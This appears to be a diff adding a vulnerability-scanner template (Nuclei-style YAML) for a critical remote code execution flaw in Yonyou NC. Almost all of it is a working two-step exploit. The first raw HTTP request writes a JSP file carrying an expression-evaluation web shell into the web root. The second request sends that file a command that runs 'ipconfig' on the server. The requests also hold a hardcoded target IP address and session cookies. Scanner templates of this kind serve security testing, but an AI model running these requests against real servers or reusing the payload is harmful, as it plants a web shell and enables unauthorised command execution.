@@ -1,0 +1,58 @@
+id: youyong-jsinvoke-upload
+
+info:
+  name: 用友nc文件上传
+  author: str1am
+  severity: critical
+  tags: youyong,rce
+
+
+requests:
+  - raw:
+      - |
+        POST /uapjs/jsinvoke/?action=invoke HTTP/1.1
+        Host: 119.13.102.104:5000
+        Pragma: no-cache
+        Cache-Control: no-cache
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,en-US;q=0.7,en;q=0.6
+        Cookie: JSESSIONID=6EBF28E2AD371D928DB8577ADA4232A3
+        Connection: close
+        Content-Length: 249
+
+        {"serviceName":"nc.itf.iufo.IBaseSPService","methodName":"saveXStreamConfig","parameterTypes":["java.lang.Object","java.lang.String"],"parameters":["${param.getClass().forName(param.error).newInstance().eval(param.cmd)}","webapps/nc_web/10011.jsp"]}
+
+      - |
+        POST /404.jsp?error=bsh.Interpreter HTTP/1.1
+        Host: 119.13.102.104:5000
+        Content-Length: 98
+        Pragma: no-cache
+        Cache-Control: no-cache
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
+        Origin: http://119.13.102.104:5000
+        Content-Type: application/x-www-form-urlencoded
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Referer: http://119.13.102.104:5000/nccloud/resources/uap/rbac/login/main/index.html
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,en-US;q=0.7,en;q=0.6
+        Cookie: JSESSIONID=DEF42F2723D5668F017063B34996A346.server
+        Connection: close
+
+        cmd=org.apache.commons.io.IOUtils.toString(Runtime.getRuntime().exec("ipconfig").getInputStream())
+
+        
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "Windows IP Configuration"
+          - "<string>"
+        part: body
+
+      - type: status
+        status:
+          - 200
